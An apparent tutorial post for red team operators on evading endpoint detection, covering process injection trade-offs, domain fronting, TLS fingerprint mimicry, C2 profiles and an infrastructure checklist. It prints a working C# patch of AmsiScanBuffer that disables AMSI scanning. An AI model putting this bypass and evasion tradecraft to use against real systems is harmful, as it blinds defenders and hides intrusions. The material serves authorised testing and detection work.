---
title: "EDR Evasion & OPSEC for Red Team Operators"
description: "Operational security principles and practical EDR evasion techniques for red team engagements — from process injection to network traffic blending."
pubDate: 2025-07-08
tags: ["red-team", "edr", "opsec", "evasion", "detection"]
difficulty: "intermediate"
---

## Threat Model: What Are You Evading?

Modern endpoint detection and response (EDR) products operate across three distinct detection layers. Understanding which layer is most likely to catch a given technique is the first step in choosing the right evasion approach.

| Layer | Examples | What it watches |
|---|---|---|
| **Static** | Defender AV, YARA rules, hash blocklists | File content at rest or on write; PE import table; strings |
| **Behavioral** | Kernel callbacks, ETW providers, API hooks | Process creation chains, memory allocation patterns, API call sequences |
| **Telemetry** | CrowdStrike, SentinelOne, Microsoft Defender for Endpoint | Aggregated event streams sent to cloud analytics; ML scoring |

A technique that bypasses static detection (e.g., custom obfuscation) may still be caught behaviorally. Techniques that bypass both static and behavioral detection can still be flagged by cloud telemetry if the activity pattern is anomalous relative to historical baselines. Effective OPSEC addresses all three layers.

---

## Process Injection Technique Comparison

Not all process injection methods carry the same detection risk. The table below compares four common techniques:

| Technique | API Footprint | EDR Hook Exposure | Unbacked MEM? | Detection Risk |
|---|---|---|---|---|
| **Classic thread injection** | `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` | High (all three are heavily monitored) | Yes | High |
| **Process hollowing** | `NtUnmapViewOfSection`, `WriteProcessMemory`, `SetThreadContext` | Medium-High | Partial (image-backed start) | High |
| **Module stomping** | Overwrite a legitimate loaded DLL's `.text` section | Low (no new allocation) | No (file-backed) | Medium |
| **Phantom DLL hollowing** | Map a non-loaded DLL into memory, overwrite, never call `LoadLibrary` | Low-Medium | Partial | Medium-Low |

**Module stomping** is currently the most evasion-effective among common techniques because the executable memory is file-backed (the VAD entry points to a real DLL on disk), which defeats memory scanners looking for unbacked executable regions. The trade-off is that you overwrite a legitimate module, which can cause instability if the target process uses that code.

---

## AMSI Bypass

The Antimalware Scan Interface (AMSI) sits between the PowerShell runtime and the AV engine, scanning script content before execution. A well-known bypass patches the `AmsiScanBuffer` function in-process to always return `AMSI_RESULT_CLEAN`:

```csharp
// EDUCATIONAL ONLY -- widely detected; do not use verbatim in real engagements
// Most EDRs will flag this exact byte pattern.
using System;
using System.Runtime.InteropServices;

class AmsiPatch {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string proc);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string lib);
    [DllImport("kernel32")] static extern bool VirtualProtect(
        IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);

    static void Patch() {
        var lib  = LoadLibrary("amsi.dll");
        var addr = GetProcAddress(lib, "AmsiScanBuffer");
        VirtualProtect(addr, (UIntPtr)5, 0x40, out uint old); // PAGE_EXECUTE_READWRITE
        Marshal.Copy(new byte[]{ 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, addr, 6);
        VirtualProtect(addr, (UIntPtr)5, old, out _);
    }
}
```

> **Detection caveat**: This exact byte sequence and the `AmsiScanBuffer` + `VirtualProtect` call pattern are signatured by virtually every major EDR as of 2025. It is included here for educational understanding only. In practice, defenders should alert on any `VirtualProtect` call targeting pages within `amsi.dll`.

A more durable approach is to target the AMSI context object in the PowerShell process's heap (setting `amsiContext` to 0), which avoids modifying executable memory entirely and leaves a smaller behavioral footprint — though this too is increasingly detected.

---

## Network OPSEC

### Domain Fronting

Domain fronting routes C2 traffic through a high-reputation CDN (Cloudflare, AWS CloudFront) so the TLS SNI and HTTP `Host` header point to a legitimate domain while the CDN forwards the request to the actual C2. Most CDN providers have restricted or banned this technique, but it remains relevant in some configurations.

### JA3 Mimicry

A C2 implant using Go's default TLS stack or a custom library produces a distinctive JA3 fingerprint different from any real browser. Using the `uTLS` library (Go) or equivalent, an implant can clone the exact TLS Client Hello of Chrome, Firefox, or Edge — including cipher suite order, extension list, and elliptic curves — making the JA3/JA4 hash match a legitimate browser.

### Malleable C2 Beacon Profiles

Cobalt Strike's Malleable C2 profiles and equivalent features in open-source frameworks (Sliver, Havoc) allow operators to customize:

- HTTP verb, URI pattern, and parameter names.
- Request/response headers to match a known application (e.g., Office 365 telemetry, Google Analytics).
- Sleep jitter and staging behaviour.

The goal is to make beacon traffic statistically indistinguishable from the legitimate application being mimicked, defeating both rule-based and ML-based network detectors.

---

## Infrastructure OPSEC Checklist

Before starting an engagement, verify the following for every C2 listener and redirector:

- [ ] Domain registered more than 30 days ago (avoids new-domain threat intel feeds).
- [ ] Domain has valid MX records and a plausible website (avoid blank-page domains).
- [ ] TLS certificate from a trusted CA (Let's Encrypt is fine; self-signed is not).
- [ ] Redirector in place between operator and target (never expose C2 IP directly).
- [ ] Redirector validates `User-Agent` and URI before proxying; returns 404 for unknown requests.
- [ ] Categorized in at least one web categorization service (e.g., Fortiguard, BlueCoat) as benign.
- [ ] No reuse of infrastructure across engagements (shared IPs correlate operations).
- [ ] Operator VPN/jump host IP not linked to personal accounts or previous engagements.
- [ ] Logging enabled on all redirectors for post-engagement deconfliction.

---

## Conclusion

Effective EDR evasion is not a single technique — it is a layered operational practice that accounts for static signatures, behavioral analytics, and cloud telemetry simultaneously. The arms race between offensive tooling and EDR vendors means that any specific bypass has a half-life; the underlying principles (minimize API footprint, blend into legitimate traffic patterns, avoid well-known byte sequences) remain constant. Red team operators should continuously update their tradecraft and test against real EDR products in lab environments before deploying techniques in engagements.
